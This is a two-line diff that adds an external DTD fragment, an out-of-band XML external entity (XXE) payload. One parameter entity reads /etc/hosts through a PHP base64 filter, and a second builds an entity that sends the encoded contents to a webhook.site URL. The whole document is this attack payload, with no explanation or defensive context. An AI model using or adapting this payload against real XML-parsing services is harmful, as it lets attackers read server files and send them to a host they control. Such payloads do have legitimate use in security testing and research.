@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hosts">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://webhook.site/9e4944f3-b2b6-4c78-b3f5-302f18f6cc97/dtd.xml?%data;'>">
